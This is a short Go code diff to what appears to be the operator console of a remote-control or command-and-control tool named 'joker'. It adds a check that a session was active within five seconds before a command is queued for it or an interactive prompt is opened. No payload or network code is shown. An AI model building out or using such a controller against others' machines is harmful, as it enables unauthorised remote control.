@@ -58,17 +58,36 @@ func main() {
 				var command_for_sess string = parsed_user_input[2]
 
 				
+				var sess joker_config
+				var act bool
 				for i:=0;i<len(sessions);i++ {
 					if sessions[i]._Auth == selected_session {
 						session_found = true
-						sessions[i]._command=command_for_sess
+						sess = sessions[i]
+
+						var timenow int64 = time.Now().UTC().Unix()
+						var active bool = false
+						if sess._Active > timenow - 5 {
+							active = true
+						}
+
+						if active {
+							sessions[i]._command=command_for_sess
+							act = true
+						} else {
+							act = false
+						}
 					}
 				}
 
-				if !session_found {
+				
+
+				if !session_found || !act {
 					fmt.Println("Session was not found.")
 					break
 				}
+
+				
 
 				_joker._connected = selected_session
 
@@ -95,7 +114,13 @@ func main() {
 					}
 				}
 
-				if session_found {
+				var timenow int64 = time.Now().UTC().Unix()
+				var active bool = false
+				if sess._Active > timenow - 5 {
+					active = true
+				}
+
+				if session_found && active {
 					for {
 						var shrompt string
 
@@ -133,7 +158,7 @@ func main() {
 						continue_use = false
 					}
 				} else {
-					fmt.Printf("Session was not found.")
+					fmt.Printf("Session was not found or is not Active.")
 				}
 			case("generate"):
 
